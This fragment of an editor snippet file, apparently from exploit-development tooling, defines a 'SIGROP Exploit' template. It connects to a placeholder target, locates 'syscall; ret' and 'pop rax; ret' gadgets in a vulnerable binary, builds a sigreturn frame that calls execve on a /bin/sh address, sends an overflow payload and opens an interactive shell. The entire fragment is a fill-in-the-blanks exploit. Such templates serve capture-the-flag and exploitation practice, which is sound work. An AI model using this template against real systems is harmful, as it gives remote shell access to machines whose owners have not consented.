  "SIGROP Exploit": {
    "prefix": "sigrop",
    "body": [
      "// SIGROP (Sigreturn-Oriented Programming)",
      "let s = connect(\"${1:target.com}\", ${2:1337})",
      "let binary = \"${3:./vuln}\"",
      "",
      "let syscall_ret = rop_find(binary, \"syscall; ret\")[0].address",
      "let pop_rax = rop_find(binary, \"pop rax; ret\")[0].address",
      "",
      "// Build sigreturn frame",
      "let frame = sigreturn_frame({",
      "    \"rax\": 59,  // execve",
      "    \"rdi\": ${4:binsh_addr},",
      "    \"rsi\": 0,",
      "    \"rdx\": 0,",
      "    \"rip\": syscall_ret",
      "})",
      "",
      "let payload = cyclic(${5:offset}) + p64(pop_rax) + p64(15) + p64(syscall_ret) + frame",
      "send(s, payload)",
      "interactive(s)"
    ],
    "description": "SIGROP exploitation technique"
  },
